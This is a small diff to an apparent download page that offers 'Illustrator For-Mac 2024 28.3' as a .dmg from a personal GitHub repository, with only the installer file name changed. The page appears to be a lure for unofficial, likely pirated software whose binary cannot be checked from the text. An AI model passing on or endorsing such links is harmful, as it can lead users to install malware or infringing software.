@@ -6,5 +6,5 @@
 <h2>Illustrator-Download-2024-For-Mac</h2>
 <p><strong>Vector graphics application widely used by designers in various areas of digital graphics,
 illustration and printing, in the development of all types of multimedia resources, such as printed materials, web content, interactive media, videos and mobile applications.</p>
-Illustrator For-Mac 2024 28.3 | <a href="https://github.com/munawar1235/Adobe-Illustrator-2024-macOS/releases/download/28.03/Installerx.dmg">Download</a>
+Illustrator For-Mac 2024 28.3 | <a href="https://github.com/munawar1235/Adobe-Illustrator-2024-macOS/releases/download/28.03/Setup_V3.0.dmg">Download</a>
 </h1>
